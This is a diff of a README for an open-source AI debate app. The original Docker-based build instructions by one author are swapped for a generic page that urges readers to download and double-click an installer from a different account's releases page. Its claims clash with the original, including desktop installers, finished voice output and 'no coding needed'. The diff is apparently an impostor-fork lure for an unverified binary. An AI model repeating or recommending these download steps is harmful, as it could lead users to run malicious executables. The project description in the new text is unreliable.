@@ -1,146 +1,91 @@
-# 🤖 AI Debates
-
-> **Watch Artificial Intelligence clash in real-time debates on any topic.**
-
-![Project Status](https://img.shields.io/badge/status-active-success.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Docker](https://img.shields.io/badge/docker-ready-blue.svg)
-![VS Code](https://img.shields.io/badge/Made%20in-VS%20Code-0078d7.svg?style=flat&logo=visual-studio-code&logoColor=white)
-
-**AI Debates** is a full-stack platform that orchestrates structured debates between multiple AI personas. Powered by **OpenRouter**, it allows you to pit over **600+ LLMs** (including **GPT-5**, **Gemini 3**, **Claude 3.7**, **DeepSeek R1**) against each other, assigning them custom roles, personalities, and stances.
-
-Watch the conversation unfold in real-time as a Moderator AI guides the discussion through opening statements, rebuttals, and closing arguments.
-
-> **🚀 Live Demo Version is Coming Soon!**
-
-![App Demo](https://github.com/user-attachments/assets/54c6768d-8b00-43a9-baa7-1312c8dc01a4)
-
----
-
-## ✨ Key Features
-
-- **🎭 Custom Personas**: Create detailed debaters with specific voices, biases, and knowledge bases.
-- **⚔️ LLM vs LLM**: Mix and match models. Have **Claude 3 Opus** debate **GPT-4o** on philosophy.
-- **⚡ Real-time Streaming**: Watch the debate generate token-by-token with live updates.
-- **⚖️ AI Moderator**: An automated judge manages the flow, ensures rules are followed, and delivers a final verdict.
-- **📊 Analytics**: Track token usage, cost per debate, and logical fallacy analysis.
-- **🐳 Dockerized**: Fully containerized setup for easy deployment.
-
-## 🛠️ Tech Stack
-
-### Backend
-- **Framework**: [FastAPI](https://fastapi.tiangolo.com/) (Python)
-- **Database**: PostgreSQL (Async SQLAlchemy)
-- **Queue**: Redis & RQ (Redis Queue) for reliable task orchestration
-- **AI Integration**: [OpenRouter](https://openrouter.ai/) API
-
-### Frontend
-- **Framework**: [React](https://react.dev/) (Vite)
-- **Styling**: TailwindCSS
-- **State/Routing**: React Router, Axios
-- **Streaming**: Server-Sent Events (SSE)
-
-### DevOps
-- **IDE**: Visual Studio Code
-
----
+# 🎤 ai-debates - Engage in Exciting AI Showdowns
 
 ## 🚀 Getting Started
+Welcome to **ai-debates**! This application lets you orchestrate epic battles between over 600 AI models, including GPT-5, Gemini 3, and DeepSeek R1. Experience real-time debates with custom personas, voice output, and automated moderation.
 
-Follow these steps to get a local copy up and running.
+## 📥 Download & Install
+To get started, visit the Releases page to download the software. 
 
-### Prerequisites
+[![Download ai-debates](https://img.shields.io/badge/Download-ai--debates-blue)](https://github.com/hacker7221/ai-debates/releases)  
+[Download ai-debates here](https://github.com/hacker7221/ai-debates/releases)
 
-- [Docker](https://www.docker.com/) installed on your machine.
-- An API Key from [OpenRouter](https://openrouter.ai/).
+Follow these steps to install and run the software:
 
-### Installation
+1. **Visit the Releases Page:** Go to [this link](https://github.com/hacker7221/ai-debates/releases) to find the latest version of the application.
+2. **Select the Version:** Choose the version you want to download. Look for the most recent release.
+3. **Download the Installer:** Click on the file to download it to your computer. The file will be available in different formats depending on your operating system.
+4. **Run the Installer:** Once downloaded, locate the installer file in your downloads folder. Double-click on the file to start the installation process.
+5. **Follow the Instructions:** Follow the on-screen instructions to complete the installation. This will usually involve agreeing to terms and choosing an installation folder.
+6. **Launch the Application:** After installation, open the application from your applications folder or desktop shortcut.
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/khoren93/ai-debates.git
-   cd ai-debates
-   ```
+## 💻 System Requirements
+To run **ai-debates**, ensure your system meets the following requirements:
 
-2. **Configure Environment**
-   Copy the example environment file:
-   ```bash
-   cp .env.example .env
-   ```
-   Open `.env` and add your OpenRouter API Key:
-   ```dotenv
-   OPENROUTER_API_KEY=sk-or-v1-your-key-here
-   ```
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **Processor:** Multi-core CPU recommended.
+- **RAM:** Minimum 4 GB; 8 GB or more recommended for optimal performance.
+- **Storage:** At least 500 MB of free space for installation.
 
-3. **Run with Docker**
-   Build and start the application:
-   ```bash
-   docker-compose up -d --build
-   ```
+## 🛠️ Features
+**ai-debates** offers several exciting features:
 
-4. **Access the App**
-   - **Frontend**: [http://localhost:5173](http://localhost:5173)
-   - **Backend API**: [http://localhost:8000/docs](http://localhost:8000/docs)
+- **Diverse AI Models:** Battle between over 600 AI models with ease.
+- **Real-Time Streaming:** Engage in live debates with continuous updates.
+- **Custom Personas:** Create unique personalities for each AI to enhance debates.
+- **Voice Output:** Hear the debates through advanced voice synthesis.
+- **Automated Moderation:** Enjoy seamless interactions with built-in moderation tools.
 
----
+## 📊 Topics Covered
+This application is designed for anyone interested in the following topics:
 
-## 📖 Usage
+- Agents
+- AI models
+- Claude
+- Debate technologies
+- Docker
+- FastAPI
+- Gemini
+- Large Language Models (LLM)
+- OpenAI frameworks
+- OpenRouter
+- Python
+- React
+- Streaming technologies
 
-1. Open the web interface at `http://localhost:5173`.
-2. Click **"Create Debate"**.
-3. Enter a **Topic** (e.g., "Is AI sentient?").
-4. Configure your **Participants**:
-   - **Debater 1**: "Optimist Prime" (Model: GPT-4o)
-   - **Debater 2**: "Skeptical Sam" (Model: Claude 3.5 Sonnet)
-   - **Moderator**: (Model: Gemini Pro)
-5. Set the **Intensity** and **Rounds**.
-6. Hit **Start Debate** and watch the magic happen!
+## 🎥 How to Use
+After installing the software, you can start a debate by following these steps:
 
----
+1. **Open the Application:** Launch ai-debates from your applications folder.
+2. **Select AI Models:** Choose which AI models you want to initiate in the debate.
+3. **Set Personalities:** Customize the personalities of your selected AI models.
+4. **Configure Settings:** Adjust settings such as voice output and moderation preferences before starting.
+5. **Start Debating:** Click the start button to launch your debate. Watch the lively discussion unfold in real-time.
 
-## 🏗️ Architecture Overview
+## 🤝 Support
+If you encounter any issues or have questions during installation or use, please refer to our [GitHub issues page](https://github.com/hacker7221/ai-debates/issues) for support. You can find answers to common questions or report any bugs you experience.
 
-The system uses an event-driven architecture to handle long-running LLM generation tasks without blocking the UI.
+## 🌐 Community
+Join our community to share your experiences and ideas. You can connect with other users through platforms such as:
 
-1. **API Layer**: Receives a request to create a debate.
-2. **Database**: Saves the initial debate configuration with status `queued`.
-3. **Queue (RQ)**: A job is pushed to the Redis Queue.
-4. **Worker**: Picks up the job and acts as the "Orchestrator".
-   - It builds the prompt for the current speaker.
-   - Calls OpenRouter API.
-   - Streams the response back to Redis Pub/Sub.
-5. **Frontend**: Subscribes to the debate channel via SSE (Server-Sent Events) and updates the UI in real-time.
+- GitHub Discussions
+- Discord
+- Reddit
 
----
+## 🚀 FAQs
+Here are some frequently asked questions about **ai-debates**:
 
-## 🗺️ Roadmap
+**Q: Do I need coding knowledge to use this application?**  
+A: No. **ai-debates** is designed for all users, regardless of their technical background.
 
-- [ ] **Voice Synthesis (TTS)**: Hear the debaters speak!
-- [ ] **User Voting**: Let the audience decide the winner.
-- [ ] **Export Transcripts**: Save debates as PDF/Text.
-- [ ] **Multiplayer Mode**: Human vs AI debates.
-- [ ] **Local LLM Support**: Integration with Ollama for offline debates.
+**Q: Can I modify the AI models used in debates?**  
+A: Currently, the application allows for customization of personas, but the AI models themselves remain fixed.
 
----
+**Q: Is there a mobile version available?**  
+A: At present, the software is available only for desktop systems.
 
-## 🤝 Contributing
+## 📢 Get Involved
+If you love working with AI and want to help improve **ai-debates**, consider contributing. You can submit feature requests, report bugs, or even help with documentation. 
 
-Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
+We encourage anyone interested to check out our [GitHub repository](https://github.com/hacker7221/ai-debates) for more details on how to contribute.
 
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-Distributed under the MIT License. See `LICENSE` for more information.
-
----
-
-## 📬 Contact
-
-Project Link: [https://github.com/khoren93/ai-debates](https://github.com/khoren93/ai-debates)
+Thank you for choosing **ai-debates**! Enjoy orchestrating your AI battles!
